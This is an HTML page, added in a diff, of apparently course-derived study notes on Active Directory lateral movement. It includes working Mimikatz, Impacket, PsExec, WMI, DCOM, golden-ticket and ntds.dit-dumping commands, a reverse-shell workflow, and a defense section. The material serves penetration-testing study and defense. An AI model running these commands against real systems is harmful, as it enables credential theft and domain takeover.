@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-200 Module 17 — Active Directory: Lateral Movement (block ADLM: WMI/WinRM, PsExec, Pass-the-Hash, Overpass-the-Hash, Pass-the-Ticket, DCOM; persistence: Golden Ticket, Shadow Copies) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../oscp.html">OSCP (PEN-200)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSCP (PEN-200)</p>
+<h1 class="nz-h2">PEN-200 Module 17 — Active Directory: Lateral Movement (block ADLM: WMI/WinRM, PsExec, Pass-the-Hash, Overpass-the-Hash, Pass-the-Ticket, DCOM; persistence: Golden Ticket, Shadow Copies)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<h2>Objective</h2>
+<p>Once a foothold and a set of domain credentials exist, the goal shifts from "get in" to "move around": authenticate as a user whose hash or ticket we possess, on a machine we've never touched, using the authentication protocols Windows itself offers. The module ladder:</p>
+<ol>
+<li><strong>Remote process creation</strong> — WMI (via deprecated <code>wmic</code>, then PowerShell/CIM), <code>WinRS</code>/WinRM and PowerShell Remoting.</li>
+<li><strong>Interactive shells</strong> — PsExec from a compromised Windows host.</li>
+<li><strong>Credential replay</strong> — Pass the Hash (NTLM), Overpass the Hash (NTLM hash → Kerberos TGT), Pass the Ticket (re-inject a TGS).</li>
+<li><strong>Protocol abuse</strong> — DCOM via the MMC20.Application COM object.</li>
+<li><strong>Persistence / escalation to domain dominance</strong> — Golden Ticket (forge TGTs with the <code>krbtgt</code> hash) and Volume Shadow Copies to steal <code>ntds.dit</code> and dump every domain credential offline.</li>
+</ol>
+<h2>Target surface</h2>
+<ul>
+<li>Domain: <code>corp.com</code>. Lab hosts referenced (names verbatim from audio): Windows 11 workstation <code>client74</code> (the "already compromised" foothold, also used for PsExec/DCOM demos), Windows 10 client <code>client76</code> (used to simulate cached credentials and Pass the Ticket), file server <code>files04</code> (Windows Server 2022), <code>web04</code> (restricted backup folder), and the domain controller (<code>DC1</code>).</li>
+<li>Users (names verbatim): <code>jen</code> — domain user and local administrator on the target machines (ASR alternates "gen"/"Gen"/"Jen"; normalized to <code>jen</code> throughout); <code>jeff</code> — the logged-in user on the clients; <code>dave</code> — user with privileged access to the <code>web04</code> backup folder; <code>jeffadmin</code> — domain admin used for the DC-side steps.</li>
+<li>The PsExec demo quotes a password for <code>corp\jen</code> — redacted here as <code>[REDACTED]</code>.</li>
+<li>Transcript note: the ASR output contains <strong>no lab IP addresses (192.168.x)</strong> — the videos narrate over screen captures, so all network locations are given as hostnames only. Mimikatz command names are heavily garbled by ASR ("SecureLSA" = <code>sekurlsa::</code>, "Secure LSA Tickets Export" = <code>sekurlsa::tickets /export</code>, "Kirby" = <code>.kirbi</code>); the listings below use the correct syntax, with the ASR source noted where the reconstruction is non-trivial.</li>
+</ul>
+<h2>Techniques</h2>
+<h3>1. WMI: remote process creation — ADLM_01_01</h3>
+<p>Windows Management Instrumentation is an object-oriented automation feature; it can create processes via the <strong>Create method of the <code>Win32_Process</code> class</strong>. Requirement: credentials of a member of the target's local Administrators group (a domain user qualifies). The demo runs as <code>jen</code> against <code>files04</code>, tested first from <code>client74</code> while logged in as <code>jeff</code>.</p>
+<p>Classic <code>wmic</code> (recently deprecated, still worth knowing):</p>
+<pre><code class="language-cmd">wmic /node:&lt;target&gt; /user:&lt;user&gt; /password:&lt;pass&gt; process call create &quot;calc.exe&quot;
+:: job returns the new PID and a Return Value of 0 = success
+</code></pre>
+<p>PowerShell translation (three building blocks):</p>
+<pre><code class="language-powershell"># 1) PSCredential object
+$user = '&lt;user&gt;'
+$pass = '&lt;pass&gt;'
+$securepass = $pass | ConvertTo-SecureString -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($user, $securepass)
+
+# 2) CIM session over DCOM (WMI's classic transport; DCOM beats the WinRM default for this attack)
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-CimSession -ComputerName &lt;target&gt; -Credential $cred -SessionOption $options
+
+# 3) invoke Win32_Process.Create
+$calc = 'calc.exe'
+Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $calc}
+</code></pre>
+<p>Verification: list processes on the target — a new calculator process confirms execution.</p>
+<p><strong>Escalation to a shell:</strong> replace the payload with a Base64-encoded PowerShell reverse shell (encoding avoids escaping special characters inside the WMI payload). The course uses a short Python helper that embeds the shell in a <code>payload</code> variable and prints the Base64 (replace IP/port with the Kali attacker's); then set up <code>nc -lvnp 443</code> on Kali and invoke the WMI script from <code>client74</code> — the listener catches a reverse shell as <code>jen</code> on the internal server.</p>
+<h3>2. WinRM: WinRS and PowerShell Remoting — ADLM_01_01</h3>
+<p>WinRM is the alternative remote-management service to WMI/DCOM.</p>
+<pre><code class="language-cmd">winrs -r:&lt;target&gt; -u:&lt;user&gt; -p:&lt;pass&gt; hostname
+winrs -r:&lt;target&gt; -u:&lt;user&gt; -p:&lt;pass&gt; whoami      :: commands provably execute on files04
+</code></pre>
+<p>Full lateral movement: swap the command for the Base64-encoded reverse shell — with a listener running, <code>files04</code> calls back.</p>
+<p>PowerShell Remoting is the built-in equivalent:</p>
+<pre><code class="language-powershell">$session = New-PSSession -ComputerName &lt;target&gt; -Credential $cred
+Enter-PSSession 1        # session ID from New-PSSession output; prompt now lives on the target
+</code></pre>
+<h3>3. PsExec (from a Windows foothold) — ADLM_01_02</h3>
+<p>PsExec (SysInternals suite — present on <code>client74</code> under <code>C:\Tools\SysinternalsSuite</code>) is "intended to replace Telnet-like applications" and executes processes remotely with an interactive console:</p>
+<pre><code class="language-cmd">psexec64.exe -i \\&lt;target-hostname&gt; -u corp\jen -p [REDACTED] cmd
+</code></pre>
+<ul>
+<li><code>-i</code> = interactive session; target host prepended with <code>\\</code>; <code>-u</code>/<code>-p</code> for domain credentials; final argument is the process (<code>cmd</code>).</li>
+<li>Result: an interactive shell <strong>directly on the target as the <code>jen</code> domain account</strong>, without involving Kali to catch a reverse shell — authentication is initiated by the compromised host itself.</li>
+<li>ASR renders the tool name "PSEgzek" and garbles the flags as <code>"-u!"</code>/<code>"-p!"</code> — normalized to the standard <code>-i/-u/-p</code> shape above.</li>
+</ul>
+<h3>4. Pass the Hash — ADLM_01_03</h3>
+<p>Authenticate to a remote system <strong>with the user's NTLM hash instead of the plaintext password</strong>. From Kali, Impacket's <code>wmiexec.py</code> (ASR: "wmi exec from the mPacket suite" = Impacket) against the local Administrator account on <code>files04</code>:</p>
+<pre><code class="language-bash">python3 wmiexec.py &lt;user&gt;@&lt;target&gt; -hashes :&lt;ntlm-hash&gt;
+</code></pre>
+<p>NTLM authentication yields code execution on the Windows Server 2022 box "directly from Kali, armed only with the user's NTLM hash." (The hash was gathered in a previous module — the technique assumes you already dumped it, e.g. with Mimikatz <code>sekurlsa::logonpasswords</code>.)</p>
+<h3>5. Overpass the Hash — ADLM_01_04</h3>
+<p>Pass the Hash locks you into NTLM authentication. Overpass the Hash <strong>abuses the NTLM hash to obtain a full Kerberos TGT</strong>, then uses Kerberos everywhere — useful because many environments disable NTLM but allow Kerberos.</p>
+<p>Setup of the precondition (a cached credential): on <code>client76</code> as <code>jeff</code>, Shift + right-click Notepad → <strong>Run as Different User</strong> → run as <code>jen</code>. Authentication caches <code>jen</code>'s NTLM hash on the machine. Dump it from an elevated shell:</p>
+<pre><code>mimikatz # sekurlsa::logonpasswords
+</code></pre>
+<p>(ASR: "secure lsa logon passwords".) The output shows <code>jen</code>'s cached NTLM hash. Now mint a process in her context that will authenticate with Kerberos only:</p>
+<pre><code>mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:&lt;ntlm-hash&gt; /run:powershell
+</code></pre>
+<p>(ASR: "SecureLSA PTH".) The spawned PowerShell runs as <code>jen</code>. <code>klist</code> shows no tickets — expected, since <code>jen</code> has not performed an interactive login. <strong>Request one</strong> by touching a network share:</p>
+<pre><code class="language-cmd">klist                                    :: empty
+net use \\files04                        :: authenticates → TGT requested
+klist                                    :: now a TGT + a TGS for the cifs service on files04
+</code></pre>
+<p>The NTLM hash is converted into a Kerberos TGT. Any Kerberos-only tool now works in this session — including Microsoft's official <code>psexec.exe</code>, which <strong>does not accept password hashes</strong>:</p>
+<pre><code class="language-cmd">psexec.exe \\files04 cmd                 :: shell on files04 as jen, via the reused TGT
+</code></pre>
+<p>(The course's PsExec section runs it from the Windows side; overpass-the-hash is what makes a hash-only attacker Kerberos-capable.)</p>
+<h3>6. Pass the Ticket — ADLM_01_05</h3>
+<p>A TGT can only be used on the machine that requested it, but a <strong>TGS (service ticket) can be exported and re-injected elsewhere</strong> to authenticate to one specific service — and for tickets belonging to the <em>current</em> user, no admin rights are needed.</p>
+<p>Scenario: <code>jen</code> is logged into <code>client76</code> but has no access to the <code>web04</code> backup folder; <code>dave</code> does. First confirm the access denial from an elevated PowerShell:</p>
+<pre><code class="language-powershell">ls \\web04\backup        :: access denied for jen
+</code></pre>
+<p>Then, in an elevated Mimikatz:</p>
+<pre><code>mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+</code></pre>
+<p>Parses LSASS memory for all TGT/TGS in every session and writes them to disk as <code>.kirbi</code> files ("Kerberos Mimikatz format"; ASR garbles to "Kirby"). List them (<code>dir *.kirbi</code> — ASR: "filtering out on the Kirby extension"), spot the <code>dave@&lt;...&gt;cifs/web04.kirbi</code> shape, and inject it:</p>
+<pre><code>mimikatz # kerberos::ptt &lt;dave-tgs&gt;.kirbi
+klist                    :: dave's ticket now sits in jen's session
+</code></pre>
+<p>Verify:</p>
+<pre><code class="language-powershell">ls \\web04\backup        :: succeeds — jen is impersonating dave for that service
+</code></pre>
+<p>Caveat from the audio: the exported ticket is replayable only while valid (it lives with its original session's lifetime) — this is a shortcut technique, not persistence.</p>
+<h3>7. DCOM / MMC20.Application — ADLM_01_06</h3>
+<p>The Distributed Component Object Model lets a client instantiate COM objects <strong>on remote machines</strong>. From an elevated PowerShell on <code>client74</code> as <code>jen</code>, instantiate a remote MMC 2.0 application object against <code>files04</code> and drive its <code>ExecuteShellCommand</code> method (parameters: command, directory, parameters, window state):</p>
+<pre><code class="language-powershell">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;, &quot;&lt;target-ip&gt;&quot;))
+$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;, $null, &quot;/c calc.exe&quot;, &quot;7&quot;)
+</code></pre>
+<p>(ASR garbles the variable name to <code>$DECOM</code> and the arguments to "command and ccalc"; the listing is the standard reconstruction of <code>GetTypeFromProgID</code> + <code>ExecuteShellCommand</code>. The calculator spawns <strong>inside session 0</strong> on the target, so no window appears on the RDP session — verify with <code>tasklist</code> filtering for <code>calc</code> after connecting to <code>files04</code>.)</p>
+<p>Escalation: replace the payload with the same Base64-encoded PowerShell reverse shell generated by the Python script from the PsExec/WMI sections, listener running on Kali — "we gained a foothold on an additional internal box by abusing the DCOM MMC application."</p>
+<h3>8. Golden Ticket (persistence) — ADLM_02_01</h3>
+<p>A Golden Ticket forges TGTs signed with the <strong><code>krbtgt</code> account's NTLM hash</strong> — anyone holding it can mint domain-admin tickets for any existing account. Prerequisite at this stage of the engagement: a domain admin account or a compromised domain controller.</p>
+<p>Setup: attempt PsExec from <code>client74</code> to the domain controller as <code>jen</code> — it <strong>fails</strong> (no permissions), establishing the baseline. Then, RDP to the DC as <code>jeffadmin</code> and extract the hash:</p>
+<pre><code>mimikatz # lsadump::lsa /patch        :: dumps krbtgt NTLM hash (+ domain SID)
+</code></pre>
+<p>Now back on <code>client74</code> as the unprivileged <code>jen</code> (forging/injecting a golden ticket needs <strong>no admin rights and works from a non-domain-joined machine</strong>):</p>
+<pre><code>mimikatz # kerberos::purge                                  :: clear existing tickets
+mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:&lt;domain-SID&gt; /krbtgt:&lt;krbtgt-ntlm-hash&gt;
+</code></pre>
+<p>Notes from the audio:</p>
+<ul>
+<li>The <code>/krbtgt</code> option (ASR: "kerbtgt instead of rc4") indicates the supplied hash belongs to the <code>krbtgt</code> account.</li>
+<li>Domain SID comes from <code>whoami /user</code>.</li>
+<li><strong>Since July 2022</strong> (Microsoft's krbtgt-account/<code>/id</code> change) the forged ticket must claim an <em>existing</em> account — hence <code>/user:jen</code>.</li>
+<li>Mimikatz defaults: user ID <code>500</code> (built-in Administrator RID) and group IDs covering the most privileged AD groups, <strong>including Domain Admins</strong>.</li>
+</ul>
+<p>Then spawn a shell inside Mimikatz and move laterally:</p>
+<pre><code>mimikatz # misc::cmd
+psexex → psexec \\dc-hostname cmd    :: succeeds
+whoami                               :: jen
+net user jen /domain /groups...      :: membership now includes Domain Admins
+</code></pre>
+<p>Key detail: PsExec must target the DC <strong>by hostname</strong> — that forces Kerberos (the forged TGT is used, i.e. an overpass-the-hash-style flow). Connecting <strong>by IP forces NTLM</strong>, and the DC would still refuse the unprivileged account. Payoff: "issue domain administrative TGTs to any existing low-privileged account, and thus obtain inconspicuous, legitimate-looking access to the entire AD domain."</p>
+<h3>9. Shadow Copies: stealing ntds.dit (persistence / domain credential dump) — ADLM_02_02</h3>
+<p>Volume Shadow Copy Service (VSS) snapshots files or entire volumes. As domain admins, abuse the signed Windows SDK binary <code>vshadow.exe</code> to copy the AD database <strong>while it is locked</strong>:</p>
+<pre><code class="language-cmd">:: on DC1 as jeffadmin, elevated prompt
+vshadow.exe -nw -p C:                  :: -nw disables writers (faster); -p stores the copy on disk
+:: note the reported shadow copy device name, e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
+reg save HKLM\SYSTEM C:\system         :: system hive — needed to decrypt the database
+</code></pre>
+<p>(ASR garbles <code>-nw</code>/<code>-p</code> into quoted <code>"-nw"</code>/<code>"-p"</code> options and "ntds.dit" survives intact; the <code>.bak</code> extension on the copied files is rendered ".bac".)</p>
+<p>Move both files to Kali and dump offline with Impacket:</p>
+<pre><code class="language-bash">secretsdump.py -ntds ntds.dit -system system local
+</code></pre>
+<p>Result: <strong>NTLM hashes and Kerberos keys for every AD user</strong> — crack them, or use them directly for pass-the-hash across the domain.</p>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>WMI/DCOM process creation</strong>: remote <code>Win32_Process.Create</code> over DCOM shows up in <strong>Security event log 4688/4689 process-creation events</strong> with the WMI host process (<code>WmiPrvSE.exe</code>) as parent — an immediate IOC. Restricting DCOM/WMI remote access to management workstations kills the technique class; the course's reliance on local-admin credential reuse is a reminder that tiered admin models (no domain creds on workstations) remove the raw material.</li>
+<li><strong>PsExec</strong>: authentication is legitimate NTLM, so detection lands on the artifacts: service creation (7045) plus the characteristic <code>PSEXESVC</code> service name and named-pipe traffic. Restrict who can run <code>psexec</code>/create remote services; SysInternals binaries in <code>C:\Tools</code> on a compromised host are living-off-the-land, so inventory admin tools.</li>
+<li><strong>Pass the Hash</strong>: NTLM logons with a hash but no corresponding plaintext/interactive session — 4624 type 3 (network) logons from unusual sources; enforcing SMB signing limits relay variants. Long-term fix: disable NTLM where Kerberos suffices.</li>
+<li><strong>Overpass the Hash / Golden Ticket</strong>: both avoid NTLM and use Kerberos, but the golden ticket is detectable because forged TGTs carry Mimikatz-default values (RID 500 claim, default group set) and outlive normal ticket lifetimes — enable <strong>Protected Users</strong>, require smart-card/Kerberos armoring, monitor 4768/4769 anomalies, and <strong>twice-rotate the <code>krbtgt</code> password</strong> after any DC compromise to invalidate all forged tickets. The July 2022 behavior change (existing account required) shows Microsoft hardening exactly this abuse.</li>
+<li><strong>Pass the Ticket</strong>: a TGS used from a host/session that never requested it — correlate 4769 request origin with usage; restrict credential caching (the whole chain started with <code>sekurlsa::logonpasswords</code> on a cached <code>jen</code> login); LSASS protection (RunAsPPL, Credential Guard) blocks the export.</li>
+<li><strong>DCOM/MMC20.Application</strong>: remote COM instantiation is logged (Microsoft-Windows-DistributedCOM operational log); the execute-shell-command child of <code>mmc.exe</code> in session 0 is the giveaway. Disable remote DCOM activation for ordinary users.</li>
+<li><strong>Shadow copies / ntds.dit theft</strong>: <code>vshadow.exe</code> execution is abnormal on a DC and 4688 will show it; block domain admins from interactive/RDP logons to DCs (the demo needed <code>jeffadmin</code> on the console), alert on <code>reg save</code> of HKLM\SYSTEM and on any copy of <code>ntds.dit</code>, and treat shadow-copy creation on domain controllers as an incident. The offline <code>secretsdump.py</code> step happens entirely on the attacker's machine — after exfiltration, only credential rotation (including <code>krbtgt</code>) helps.</li>
+<li>Cross-cutting: every technique in this module consumed <strong>credentials harvested earlier</strong> (local-admin NTLM hash, cached logon, domain admin access). Lateral-movement defense is therefore first credential hygiene — least privilege, no password reuse, tiered administration, LSASS protection — and second authentication-protocol hardening (Kerberos-only, ticket lifetime/rotation).</li>
+</ul>
+<h2>ASR-ambiguity flags</h2>
+<ul>
+<li>User name: audio alternates <strong>"gen"/"Gen"/"Jen"</strong> — normalized to <code>jen</code> (consistent with sibling users <code>jeff</code>/<code>dave</code>/<code>jeffadmin</code>); the <code>/user:</code> argument value should be re-checked against the actual lab if replaying.</li>
+<li>Tool/command names garbled by ASR and reconstructed: "PSEgzek" → <strong>PsExec</strong>; "mPacket" → <strong>Impacket</strong>; "SecureLSA PTH"/"secure lsa logon passwords" → <strong><code>sekurlsa::pth</code> / <code>sekurlsa::logonpasswords</code></strong>; "Secure LSA Tickets Export" → <strong><code>sekurlsa::tickets /export</code></strong>; "Kirby format"/".kirby" → <strong><code>.kirbi</code></strong>; "CurbTGT"/"kerbtgt" → <strong><code>krbtgt</code></strong>; "misccmd" → <strong><code>misc::cmd</code></strong>; "K-List"/"klist" → <strong><code>klist</code></strong>; "DER, filtering out on the Kirby extension" → <strong><code>dir *.kirbi</code></strong>.</li>
+<li>WMI/PowerShell listings (PSCredential, <code>New-CimSession -SessionOption</code>, <code>Invoke-CimMethod ... Win32_Process ... Create</code>) are narrated, not dictated — shapes reconstructed from the standard cmdlets named in audio.</li>
+<li>DCOM example: ASR gives <code>$DECOM</code> variable and arguments "command and ccalc" — reconstructed as standard <code>GetTypeFromProgID("MMC20.Application", ...)</code> + <code>ExecuteShellCommand("cmd", ..., "/c calc.exe", ...)</code>.</li>
+<li><code>.bac files</code> → the copied database/system files (course uses <strong><code>.bak</code></strong>); <code>vshadow.exe</code> flags <code>-nw -p</code> quoted garbled but names survive.</li>
+<li>Golden-ticket PsExec line rendered "PSExec as the gen user ... with the command command" — the spawned process is <code>cmd</code>.</li>
+<li><strong>No lab IP addresses and no full command transcripts are recoverable from audio</strong> — all <code>&lt;target&gt;</code> placeholders are hostnames/files04/web04/DC per narration; the PsExec password is redacted as <code>[REDACTED]</code> per policy.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
